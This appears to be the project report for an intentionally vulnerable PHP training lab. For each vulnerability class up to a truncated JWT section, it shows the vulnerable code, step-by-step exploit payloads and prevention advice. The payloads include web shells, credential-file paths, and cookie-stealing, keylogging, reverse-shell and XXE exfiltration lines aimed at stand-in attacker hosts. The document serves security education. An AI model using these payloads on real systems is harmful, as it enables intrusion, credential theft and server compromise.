@@ -1,0 +1,1662 @@
+# **Complete Security Training Lab - Project Report**
+
+## **Table of Contents**
+1. [Project Overview](#project-overview)
+2. [System Architecture](#system-architecture)
+3. [Vulnerabilities Catalog](#vulnerabilities-catalog)
+4. [Detailed Testing Guide](#detailed-testing-guide)
+5. [Installation & Setup](#installation--setup)
+6. [Educational Value](#educational-value)
+7. [Security Considerations](#security-considerations)
+8. [Future Enhancements](#future-enhancements)
+
+---
+
+## **1. Project Overview**
+
+### **Purpose & Objectives**
+The **Vulnerable Security Training Lab** is an intentionally vulnerable web application designed for cybersecurity education, penetration testing practice, and security awareness training. This platform serves multiple purposes:
+
+- **Educational Tool**: Provides hands-on experience with real-world web vulnerabilities in a safe, controlled environment
+- **Penetration Testing Practice**: Allows security professionals to practice exploitation techniques without legal concerns
+- **CTF Training**: Serves as a Capture The Flag training platform with multiple challenge categories
+- **Developer Awareness**: Helps developers understand how vulnerabilities manifest and their potential impact
+- **Security Testing**: Enables testing of security tools (scanners, proxies, etc.) against known vulnerabilities
+
+### **Key Features**
+- **16+ Different Vulnerabilities**: Covers OWASP Top 10 and beyond
+- **Interactive Interface**: Modern, user-friendly design with clear instructions
+- **Realistic Scenarios**: Simulates actual vulnerable applications found in production
+- **Safe Environment**: All vulnerabilities are contained within the local testing environment
+- **Educational Content**: Each vulnerability includes explanations, examples, and prevention tips
+- **Progress Tracking**: Challenge mode with completion tracking
+- **Responsive Design**: Works on desktop and mobile devices
+
+### **Target Audience**
+1. **Security Students** - Learning web application security fundamentals
+2. **Penetration Testers** - Practicing exploitation techniques
+3. **Developers** - Understanding security vulnerabilities they might create
+4. **Security Analysts** - Testing security tools and methodologies
+5. **CTF Players** - Preparing for cybersecurity competitions
+6. **Security Educators** - Teaching web application security concepts
+
+---
+
+## **2. System Architecture**
+
+### **Technology Stack**
+- **Frontend**: HTML5, CSS3, JavaScript (vanilla)
+- **Backend**: PHP 7.4+
+- **Database**: MySQL (via `config.php`)
+- **Server**: Apache/NGINX with PHP support
+- **Dependencies**: None (pure PHP/MySQL)
+
+### **File Structure**
+```
+vuln-lab/
+├── config.php              # Database configuration
+├── index.php              # Main navigation page
+├── nav.php                # Dashboard with all vulnerabilities
+├── challenge.php          # Multi-vulnerability challenge
+│
+├── SQL Injection/
+│   ├── index.php          # Vulnerable login form
+│   └── login.php          # Vulnerable authentication handler
+│
+├── XSS/
+│   └── xss.php            # Reflected XSS vulnerability
+│
+├── File Upload/
+│   └── upload.php         # Unrestricted file upload
+│   └── uploads/           # Upload directory
+│
+├── Path Traversal/
+│   └── path_traversal.php # Directory traversal
+│
+├── Command Injection/
+│   └── command_injection.php # OS command injection
+│
+├── IDOR/
+│   └── idor.php           # Insecure Direct Object Reference
+│
+├── SSRF/
+│   └── ssrf.php           # Server-Side Request Forgery
+│
+├── XXE/
+│   └── xxe.php            # XML External Entity
+│
+├── Deserialization/
+│   └── deserialization.php # Insecure deserialization
+│
+├── SSTI/
+│   └── ssti.php           # Server-Side Template Injection
+│
+├── Race Condition/
+│   └── race_condition.php # Concurrency vulnerability
+│
+├── HTTP Smuggling/
+│   └── smuggling.php      # HTTP request smuggling
+│
+├── JWT/
+│   └── jwt.php            # JWT vulnerabilities
+│
+├── CSRF/
+│   └── csrf.php           # Cross-Site Request Forgery
+│
+└── Open Redirect/
+    └── open_redirect.php  # Open redirect vulnerability
+```
+
+### **Database Schema**
+```sql
+-- File: setup_database.sql
+CREATE DATABASE vulnsite;
+USE vulnsite;
+
+CREATE TABLE users (
+    id INT PRIMARY KEY AUTO_INCREMENT,
+    username VARCHAR(50),
+    password VARCHAR(50),
+    email VARCHAR(100),
+    role VARCHAR(20) DEFAULT 'user'
+);
+
+-- Insert test data
+INSERT INTO users (username, password, email, role) VALUES
+('admin', 'admin123', 'admin@test.com', 'admin'),
+('john', 'password', 'john@test.com', 'user'),
+('jane', '123456', 'jane@test.com', 'user'),
+('test', 'test', 'test@test.com', 'user');
+```
+
+---
+
+## **3. Vulnerabilities Catalog**
+
+### **OWASP Top 10 2021 Coverage**
+- ✅ **A01:2021-Broken Access Control** (IDOR, Path Traversal)
+- ✅ **A02:2021-Cryptographic Failures** (JWT Weak Secrets)
+- ✅ **A03:2021-Injection** (SQLi, XSS, Command, XXE, SSTI, Deserialization)
+- ✅ **A04:2021-Insecure Design** (Race Conditions)
+- ✅ **A05:2021-Security Misconfiguration** (File Upload)
+- ✅ **A06:2021-Vulnerable Components** (Simulated via vulnerable code)
+- ✅ **A07:2021-Identification Failures** (CSRF, Session Issues)
+- ✅ **A08:2021-Software/Data Integrity** (Deserialization)
+- ✅ **A09:2021-Security Logging Failures** (All vulnerabilities)
+- ✅ **A10:2021-SSRF** (Server-Side Request Forgery)
+
+### **Additional Advanced Vulnerabilities**
+- HTTP Request Smuggling
+- Open Redirect
+- Template Injection (SSTI)
+- Object Injection (Deserialization)
+- JWT Manipulation
+- Race Conditions (TOCTOU)
+
+---
+
+## **4. Detailed Testing Guide**
+
+## **🔴 1. SQL Injection (SQLi)**
+
+### **Location**: `index.php` → `login.php`
+
+### **Vulnerability Description**
+The login form directly concatenates user input into SQL queries without sanitization or prepared statements, allowing attackers to manipulate the query logic.
+
+### **Vulnerable Code**
+```php
+// login.php - Line 7-9
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Authentication Bypass**
+```
+Username: admin' --
+Password: [anything]
+```
+**Result**: Logs in as admin without valid password
+
+#### **Step 2: Union-Based Data Extraction**
+```
+Username: ' UNION SELECT 1,2,3,4 --
+Password: [anything]
+```
+**Expected**: Returns additional rows showing column count
+
+#### **Step 3: Database Enumeration**
+```
+Username: ' UNION SELECT 1,database(),user(),version() --
+Password: [anything]
+```
+**Expected**: Displays database name, current user, and MySQL version
+
+#### **Step 4: Table Enumeration**
+```
+Username: ' UNION SELECT 1,table_name,3,4 FROM information_schema.tables --
+Password: [anything]
+```
+**Expected**: Lists all tables in the database
+
+#### **Step 5: Data Exfiltration**
+```
+Username: ' UNION SELECT 1,username,password,4 FROM users --
+Password: [anything]
+```
+**Expected**: Extracts all usernames and passwords
+
+### **Advanced Payloads**
+```sql
+-- Time-based blind SQLi
+' OR SLEEP(5) --
+
+-- Error-based SQLi
+' AND ExtractValue(1, CONCAT(0x5c, (SELECT @@version))) --
+
+-- Boolean-based blind SQLi
+' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a' --
+```
+
+### **Prevention**
+- Use prepared statements with parameterized queries
+- Implement input validation and sanitization
+- Apply the principle of least privilege
+- Use stored procedures
+- Implement proper error handling (no detailed errors to users)
+
+---
+
+## **🔴 2. Cross-Site Scripting (XSS)**
+
+### **Location**: `xss.php`
+
+### **Vulnerability Description**
+User input is directly echoed to the page without proper output encoding, allowing JavaScript execution in victims' browsers.
+
+### **Vulnerable Code**
+```php
+// xss.php - Line 96
+echo "You searched for: " . $_GET['q'];
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Proof of Concept**
+```
+<script>alert('XSS')</script>
+```
+**Expected**: JavaScript alert box appears
+
+#### **Step 2: Cookie Theft**
+```
+<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+```
+**Expected**: Sends session cookies to attacker's server
+
+#### **Step 3: Keylogger**
+```
+<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+e.key)}</script>
+```
+**Expected**: Captures and sends keystrokes
+
+#### **Step 4: DOM-Based XSS**
+```
+"><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+```
+**Expected**: Various methods to execute JavaScript
+
+#### **Step 5: Advanced Payloads**
+```html
+<!-- Bypass Basic Filters -->
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+
+<!-- Using Events -->
+<IMG SRC=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+
+<!-- Data URI -->
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+```
+
+### **Impact**
+- Session hijacking
+- Credential theft
+- Defacement
+- Malware distribution
+- Phishing attacks
+
+### **Prevention**
+- Use proper output encoding (htmlspecialchars in PHP)
+- Implement Content Security Policy (CSP)
+- Validate and sanitize all user input
+- Use HTTPOnly and Secure cookie flags
+- Implement XSS filters
+
+---
+
+## **🔴 3. File Upload Vulnerabilities**
+
+### **Location**: `upload.php`
+
+### **Vulnerability Description**
+The application accepts file uploads without proper validation of file types, names, or content, allowing attackers to upload malicious files.
+
+### **Vulnerable Code**
+```php
+// upload.php - Line 51-52
+$file = $_FILES["file"]["name"];
+$target_file = $target_dir . basename($file);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: PHP Web Shell Upload**
+**File**: `shell.php`
+**Content**:
+```php
+<?php system($_GET['cmd']); ?>
+```
+**Access**: `http://localhost/uploads/shell.php?cmd=whoami`
+
+#### **Step 2: Double Extension Bypass**
+**File**: `shell.php.jpg`
+**Expected**: Some systems check only the last extension
+
+#### **Step 3: Null Byte Injection**
+**File**: `shell.php%00.jpg`
+**Expected**: May truncate at null byte
+
+#### **Step 4: Case Sensitivity**
+**File**: `shell.PHP`, `shell.Php`
+**Expected**: Bypass case-sensitive filters
+
+#### **Step 5: File Content Bypass**
+**File**: `shell.jpg` (with PHP code in EXIF data)
+**Expected**: Some systems only check file headers
+
+#### **Step 6: Path Traversal in Filename**
+**File**: `../../../var/www/html/shell.php`
+**Expected**: Upload to web root directory
+
+### **Advanced Web Shells**
+```php
+<?php
+// Reverse Shell
+$sock=fsockopen("attacker-ip",4444);
+exec("/bin/sh -i <&3 >&3 2>&3");
+
+// File Manager
+echo '<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit></form>';
+if(isset($_FILES['f'])) move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);
+
+// PHP Info
+phpinfo();
+
+// Command Execution Interface
+if(isset($_GET['cmd'])) { system($_GET['cmd']); }
+?>
+```
+
+### **Impact**
+- Remote code execution
+- Complete server compromise
+- Data exfiltration
+- Backdoor persistence
+- DDoS participation
+
+### **Prevention**
+- Validate file types by MIME type and extension
+- Rename uploaded files
+- Store files outside web root
+- Scan files for malware
+- Implement file size limits
+- Use allowlists for extensions
+
+---
+
+## **🔴 4. Path Traversal (Directory Traversal)**
+
+### **Location**: `path_traversal.php`
+
+### **Vulnerability Description**
+User-controlled input is used to construct file paths without proper sanitization, allowing access to files outside the intended directory.
+
+### **Vulnerable Code**
+```php
+// path_traversal.php - Line 80-81
+$filename = $_GET['file'];
+$content = file_get_contents($filename);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Traversal**
+```
+../../../../etc/passwd
+```
+**Expected**: Displays Linux password file
+
+#### **Step 2: Windows Traversal**
+```
+..\..\..\windows\win.ini
+```
+**Expected**: Displays Windows configuration file
+
+#### **Step 3: Absolute Path**
+```
+/etc/shadow
+C:\Windows\System32\config\SAM
+```
+**Expected**: Access sensitive system files
+
+#### **Step 4: Encoded Payloads**
+```
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+```
+**Expected**: Bypass basic filters
+
+#### **Step 5: Null Byte Injection**
+```
+../../../etc/passwd%00.txt
+```
+**Expected**: Bypass extension checks
+
+#### **Step 6: Source Code Access**
+```
+../index.php
+../../config.php
+```
+**Expected**: View application source code
+
+### **Critical Files to Access**
+
+#### **Linux/Unix**
+```
+/etc/passwd          # User accounts
+/etc/shadow          # Password hashes
+/etc/hosts           # Host mappings
+/etc/ssh/ssh_host_key # SSH keys
+/var/log/auth.log    # Authentication logs
+/proc/self/environ   # Environment variables
+```
+
+#### **Windows**
+```
+C:\Windows\win.ini
+C:\Windows\System32\config\SAM
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+```
+
+#### **Application Files**
+```
+../.env              # Environment variables
+../config.php        # Database credentials
+../.git/config       # Git configuration
+../wp-config.php     # WordPress config
+```
+
+### **Impact**
+- Sensitive data exposure
+- Credential theft
+- Source code disclosure
+- Configuration exposure
+- Privilege escalation
+
+### **Prevention**
+- Use basename() to get filename only
+- Implement allowlists for allowed files
+- Normalize paths before processing
+- Store files outside web root
+- Use chroot jails
+- Implement proper file permissions
+
+---
+
+## **🔴 5. Command Injection**
+
+### **Location**: `command_injection.php`
+
+### **Vulnerability Description**
+User input is directly concatenated into system command execution without sanitization, allowing arbitrary command execution.
+
+### **Vulnerable Code**
+```php
+// command_injection.php - Line 91
+$command = "ping -c 4 " . $ip;
+$output = shell_exec($command);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Injection**
+```
+127.0.0.1; whoami
+```
+**Expected**: Executes `whoami` command
+
+#### **Step 2: Chained Commands**
+```
+127.0.0.1 && id
+127.0.0.1 | ls -la
+127.0.0.1 || uname -a
+```
+**Expected**: Various command chaining techniques
+
+#### **Step 3: Subshell Execution**
+```
+127.0.0.1`id`
+127.0.0.1$(whoami)
+```
+**Expected**: Command substitution
+
+#### **Step 4: System Reconnaissance**
+```
+127.0.0.1; uname -a                # System info
+127.0.0.1 && cat /etc/passwd       # User accounts
+127.0.0.1 | ps aux                 # Running processes
+127.0.0.1; netstat -tulpn          # Network connections
+127.0.0.1 && ifconfig              # Network interfaces
+```
+
+#### **Step 5: File System Access**
+```
+127.0.0.1; ls -la /var/www
+127.0.0.1 && cat config.php
+127.0.0.1; find / -name "*.php" -type f
+```
+
+#### **Step 6: Reverse Shell**
+```
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+127.0.0.1 && nc ATTACKER_IP 4444 -e /bin/bash
+```
+
+### **Injection Operators**
+
+#### **Unix/Linux**
+```
+;       # Command separator
+&       # Background execution
+&&      # Execute if previous succeeds
+||      # Execute if previous fails
+|       # Pipe output
+``      # Backtick substitution
+$()     # Command substitution
+\n      # Newline execution
+```
+
+#### **Windows**
+```
+&       # Command separator
+&&      # Execute if previous succeeds
+||      # Execute if previous fails
+|       # Pipe output
+%0a     # Newline
+^       # Escape character
+```
+
+### **Impact**
+- Complete system compromise
+- Data exfiltration
+- Ransomware deployment
+- Botnet enrollment
+- Pivoting to internal network
+
+### **Prevention**
+- Avoid shell_exec(), system(), exec(), passthru()
+- Use language-specific APIs instead of shell commands
+- Implement strict input validation (allowlists)
+- Use parameterized commands
+- Run with least privilege
+- Implement command allowlisting
+
+---
+
+## **🔴 6. IDOR (Insecure Direct Object Reference)**
+
+### **Location**: `idor.php`
+
+### **Vulnerability Description**
+Direct references to objects (like user IDs) are exposed without authorization checks, allowing unauthorized access to other users' data.
+
+### **Vulnerable Code**
+```php
+// idor.php - Line 14
+$user_id = isset($_GET['id']) ? (int)$_GET['id'] : 1;
+// No authorization check!
+if (isset($users[$user_id])) {
+    $user = $users[$user_id];
+}
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Parameter Manipulation**
+```
+?id=1  # Your profile
+?id=2  # Another user's profile
+?id=3  # Third user's profile
+```
+**Expected**: Access different users' data by changing ID
+
+#### **Step 2: Sequential Enumeration**
+```
+?id=100
+?id=101
+?id=102
+```
+**Expected**: Discover valid object references
+
+#### **Step 3: Predictable Patterns**
+```
+?id=admin
+?id=12345
+?id=0001
+```
+**Expected**: Test common ID patterns
+
+#### **Step 4: AJAX Endpoint Testing**
+```
+?id=1&ajax=true
+?id=2&ajax=true
+```
+**Expected**: Access JSON data directly
+
+#### **Step 5: POST Parameter Testing**
+```http
+POST /idor.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+user_id=2&action=delete
+```
+**Expected**: Test IDOR in POST requests
+
+### **Common IDOR Locations**
+- `/profile?id=USER_ID`
+- `/download?file_id=FILE_ID`
+- `/api/users/USER_ID`
+- `/orders/ORDER_ID/invoice`
+- `/messages/MESSAGE_ID`
+- `/reset-password?token=RESET_TOKEN`
+
+### **Impact**
+- Unauthorized data access
+- Information disclosure
+- Privilege escalation
+- Data manipulation
+- Account takeover
+
+### **Prevention**
+- Implement proper authorization checks
+- Use indirect object references (mapping)
+- Implement access control lists (ACL)
+- Use random, unguessable IDs (UUIDs)
+- Validate user ownership of resources
+- Implement session-based authorization
+
+---
+
+## **🔴 7. SSRF (Server-Side Request Forgery)**
+
+### **Location**: `ssrf.php`
+
+### **Vulnerability Description**
+The application fetches URLs provided by users without validation, allowing attackers to make the server request internal resources.
+
+### **Vulnerable Code**
+```php
+// ssrf.php - Line 9-11
+$url = $_GET['url'];
+// Direct file_get_contents with user input
+$content = @file_get_contents($url);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Internal Service Discovery**
+```
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+```
+**Expected**: Access localhost services
+
+#### **Step 2: Metadata Service Access (Cloud)**
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/
+```
+**Expected**: Access cloud metadata (AWS, GCP, Azure)
+
+#### **Step 3: File Protocol Access**
+```
+file:///etc/passwd
+file:///C:/Windows/win.ini
+```
+**Expected**: Read local files
+
+#### **Step 4: Port Scanning**
+```
+http://127.0.0.1:22      # SSH
+http://127.0.0.1:3306    # MySQL
+http://127.0.0.1:6379    # Redis
+http://127.0.0.1:27017   # MongoDB
+http://127.0.0.1:5984    # CouchDB
+```
+**Expected**: Discover internal services by response time/errors
+
+#### **Step 5: Protocol Schemes**
+```
+dict://localhost:11211/stat    # Memcached
+gopher://localhost:6379/_info  # Redis
+ldap://localhost:389           # LDAP
+ftp://attacker.com/file.txt    # FTP
+```
+
+#### **Step 6: Bypass Techniques**
+```
+http://localhost@attacker.com
+http://localhost:80#@attacker.com
+http://localhost?redirect=attacker.com
+http://2130706433/ (127.0.0.1 as integer)
+http://0x7f000001/ (127.0.0.1 as hex)
+```
+
+### **Critical Internal Endpoints**
+
+#### **AWS Metadata**
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
+```
+
+#### **Kubernetes**
+```
+http://127.0.0.1:10255/pods
+http://127.0.0.1:10250/pods
+```
+
+#### **Docker**
+```
+http://127.0.0.1:2375/version
+http://127.0.0.1:2376/containers/json
+```
+
+### **Impact**
+- Internal network reconnaissance
+- Credential theft (metadata services)
+- Remote code execution
+- Port scanning internal network
+- Denial of service
+- Data exfiltration
+
+### **Prevention**
+- Implement URL validation (allowlists)
+- Disable dangerous URL schemes (file://, gopher://, etc.)
+- Use network segmentation
+- Implement outbound firewall rules
+- Use whitelisted domains only
+- Implement authentication for internal services
+
+---
+
+## **🔴 8. XXE (XML External Entity)**
+
+### **Location**: `xxe.php`
+
+### **Vulnerability Description**
+XML parsing accepts external entity definitions, allowing attackers to read files, perform SSRF, or cause denial of service.
+
+### **Vulnerable Code**
+```php
+// xxe.php - Line 6
+libxml_disable_entity_loader(false); // ⚠️ Dangerous!
+// Line 20-21
+$dom = new DOMDocument();
+$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic File Read**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+```
+**Expected**: Contents of /etc/passwd displayed
+
+#### **Step 2: SSRF via XXE**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<data>&xxe;</data>
+```
+**Expected**: Access metadata service
+
+#### **Step 3: Out-of-Band Data Exfiltration**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+<data>&exfil;</data>
+```
+**With evil.dtd:**
+```dtd
+<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
+%all;
+```
+
+#### **Step 4: Denial of Service (Billion Laughs)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY a0 "lol">
+  <!ENTITY a1 "&a0;&a0;">
+  <!ENTITY a2 "&a1;&a1;">
+  <!ENTITY a3 "&a2;&a2;">
+  <!ENTITY a4 "&a3;&a3;">
+  <!ENTITY a5 "&a4;&a4;">
+]>
+<data>&a5;</data>
+```
+
+#### **Step 5: PHP Expect Wrapper**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<data>&xxe;</data>
+```
+
+### **XXE in Different Contexts**
+
+#### **SOAP Requests**
+```xml
+<soap:Body>
+  <foo>
+    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com"> %dtd;]>
+    <xxx/>]]>
+  </foo>
+</soap:Body>
+```
+
+#### **SVG Files**
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY test SYSTEM "file:///etc/passwd">
+]>
+<svg>&test;</svg>
+```
+
+#### **DOCX/ODT Files**
+(ZIP files containing XML - extract, modify, rezip)
+
+### **Impact**
+- Local file reading
+- Server-side request forgery
+- Denial of service
+- Port scanning
+- Remote code execution (in some cases)
+
+### **Prevention**
+- Disable XML external entities
+- Use JSON instead of XML
+- Implement XML schema validation
+- Use SAX parsers instead of DOM
+- Implement input filtering
+- Keep XML processors updated
+
+---
+
+## **🔴 9. Insecure Deserialization**
+
+### **Location**: `deserialization.php`
+
+### **Vulnerability Description**
+User-controlled serialized data is deserialized without validation, allowing object injection and code execution through magic methods.
+
+### **Vulnerable Code**
+```php
+// deserialization.php - Line 56
+$obj = unserialize($data);
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Object Injection**
+```
+O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}
+```
+**Expected**: Creates User object with admin privileges
+
+#### **Step 2: Magic Method Exploitation**
+```php
+// Look for classes with:
+__destruct()  // Called when object is destroyed
+__wakeup()    // Called during unserialize
+__toString()  // Called when object is used as string
+__call()      // Called when inaccessible method is invoked
+```
+
+#### **Step 3: Property Manipulation**
+```php
+// Change visibility
+O:4:"User":2:{s:8:"username";s:5:"admin";s:10:"\0*\0isAdmin";b:1;}
+```
+
+#### **Step 4: POP Chains (Property Oriented Programming)**
+Chain multiple magic methods across different classes to achieve code execution.
+
+#### **Step 5: Real-world Example (PHPGGC)**
+Use PHP Generic Gadget Chains to generate payloads for common frameworks:
+- Symfony
+- Laravel
+- Wordpress
+- Drupal
+- ZendFramework
+
+### **Common Attack Vectors**
+
+#### **PHP Object Injection**
+```php
+// Vulnerable class
+class Vulnerable {
+    private $cmd;
+    function __destruct() {
+        system($this->cmd);
+    }
+}
+
+// Payload
+O:10:"Vulnerable":1:{s:13:"Vulnerablecmd";s:6:"whoami";}
+```
+
+#### **Python Pickle**
+```python
+import pickle
+import os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('whoami',))
+
+pickle.dumps(RCE())
+```
+
+#### **Java Deserialization**
+Use ysoserial to generate payloads for:
+- CommonsCollections
+- ROME
+- Spring
+- Jdk7u21
+
+### **Impact**
+- Remote code execution
+- Denial of service
+- Authentication bypass
+- Privilege escalation
+- Arbitrary file read/write
+
+### **Prevention**
+- Avoid unserialize() with user input
+- Use JSON instead of serialization
+- Implement digital signatures
+- Use PHP's allowed_classes option
+- Validate serialized data structure
+- Use type-safe deserialization
+
+---
+
+## **🔴 10. SSTI (Server-Side Template Injection)**
+
+### **Location**: `ssti.php`
+
+### **Vulnerability Description**
+User input is inserted into templates without proper sanitization, allowing template engine code execution.
+
+### **Vulnerable Code**
+```php
+// ssti.php - Line 32-35
+// DANGEROUS: Evaluate PHP code
+if (strpos($expression, 'php') !== false) {
+    $expression = str_replace(['php', 'echo', 'print', 'system'], '', $expression);
+}
+$result = eval('return ' . $expression . ';');
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Basic Detection**
+```
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+```
+**Expected**: Returns 49 if vulnerable
+
+#### **Step 2: Identify Template Engine**
+```
+{{''.class}}          # Jinja2
+${''.class}           # FreeMarker
+{{7*'7'}}             # Twig returns '7777777'
+```
+
+#### **Step 3: Execute Commands**
+
+##### **Jinja2 (Python)**
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config.items() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[401]('whoami', shell=True, stdout=-1).communicate() }}
+```
+
+##### **Twig (PHP)**
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+```
+
+##### **FreeMarker (Java)**
+```
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
+${"freemarker.template.utility.Execute"?new()("whoami")}
+```
+
+##### **Velocity (Java)**
+```
+#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
+```
+
+##### **Smarty (PHP)**
+```
+{php}echo `whoami`;{/php}
+{$smarty.version}
+```
+
+#### **Step 4: Read Files**
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+```
+
+### **Impact**
+- Remote code execution
+- File system access
+- Server compromise
+- Data exfiltration
+- Privilege escalation
+
+### **Prevention**
+- Use logic-less templates
+- Implement context-aware auto-escaping
+- Sandbox template execution
+- Validate template inputs
+- Use allowlists for template variables
+- Keep template engines updated
+
+---
+
+## **🔴 11. Race Conditions**
+
+### **Location**: `race_condition.php`
+
+### **Vulnerability Description**
+Concurrent operations on shared resources without proper locking, allowing attackers to exploit timing differences.
+
+### **Vulnerable Code**
+```php
+// race_condition.php - Line 20-30
+function vulnerableTransfer($amount) {
+    usleep(rand(100000, 500000)); // Simulate delay
+    
+    $old_balance = $_SESSION['balance'];
+    $new_balance = $old_balance - $amount;
+    
+    // No transaction locking
+    $_SESSION['balance'] = $new_balance;
+}
+```
+
+### **Testing Methodology**
+
+#### **Step 1: Concurrent Balance Transfer**
+Send multiple transfer requests simultaneously:
+```bash
+# Using parallel requests
+for i in {1..10}; do
+  curl -X POST -d "amount=300&to_account=ATTACKER" http://localhost/race_condition.php &
+done
+```
+**Expected**: Negative balance or multiple successful transfers
+
+#### **Step 2: TOCTOU (Time-of-Check Time-of-Use)**
+1. Check condition (balance > amount)
+2. Delay
+3. Use stale data to perform action
+
+#### **Step 3: File Race Conditions**
+```php
+// Vulnerable file creation
+if (!file_exists($file)) {
+    // Race condition window
+    file_put_contents($file, $data);
+}
+```
+
+#### **Step 4: Account Takeover**
+1. Request password reset
+2. Quickly use token before it's invalidated
+3. Multiple accounts with same token
+
+### **Common Race Condition Scenarios**
+- **Bank transfers**: Double spending
+- **E-commerce**: Inventory overselling
+- **Ticket booking**: Double booking
+- **File uploads**: Overwrite sensitive files
+- **Password reset**: Token reuse
+- **Rate limiting**: Bypass attempts
+
+### **Testing Tools**
+- **Burp Suite Turbo Intruder**
+- **OWASP ZAP**
+- **Custom Python scripts with threading**
+- **Apache Bench (ab)**
+- **Siege**
+
+### **Impact**
+- Financial loss (double spending)
+- Inventory manipulation
+- Authentication bypass
+- Privilege escalation
+- Data corruption
+- Denial of service
+
+### **Prevention**
+- Implement proper locking mechanisms
+- Use database transactions
+- Atomic operations
+- Optimistic/pessimistic locking
+- Rate limiting
+- Idempotent operations
+- Use queues for processing
+
+---
+
+## **🔴 12. HTTP Request Smuggling**
+
+### **Location**: `smuggling.php`
+
+### **Vulnerability Description**
+Manipulation of HTTP headers (Content-Length vs Transfer-Encoding) causes request parsing discrepancies between frontend and backend servers.
+
+### **Testing Methodology**
+
+#### **Step 1: CL.TE (Frontend: Content-Length, Backend: Transfer-Encoding)**
+```http
+POST /smuggling.php HTTP/1.1
+Host: localhost
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 15
+
+x=1
+```
+
+#### **Step 2: TE.CL (Frontend: Transfer-Encoding, Backend: Content-Length)**
+```http
+POST /smuggling.php HTTP/1.1
+Host: localhost
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Length: 15
+
+0
+
+```
+
+#### **Step 3: TE.TE with Obscured TE**
+```http
+POST /smuggling.php HTTP/1.1
+Host: localhost
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+5c
+GPOST / HTTP/1.1
+Content-Length: 15
+
+0
+
+```
+
+### **Detection Techniques**
+
+#### **Differential Response**
+1. Send normal request → Note response
+2. Send smuggled request → Compare response
+3. Look for differences in status code, headers, body
+
+#### **Timing Attacks**
+Smuggled requests may cause timeouts or delayed responses.
+
+#### **Response Queue Poisoning**
+Smuggle request to affect next user's request.
+
+### **Impact**
+- Bypass security controls
+- Hijack user sessions
+- Cache poisoning
+- Web cache deception
+- Credential theft
+- Cross-site scripting
+
+### **Prevention**
+- Use HTTP/2 (prevents some smuggling)
+- Disable connection reuse
+- Normalize requests at load balancer
+- Use same server software throughout
+- Reject ambiguous requests
+- Implement request validation
+
+---
+
+## **🔴 13. JWT Vulnerabilities**
+
+### **Location**: `jwt.php`
+
+### **Vulnerability Description**
+JSON Web Token implementation flaws allow token manipulation, signature bypass, and privilege escalation.
+
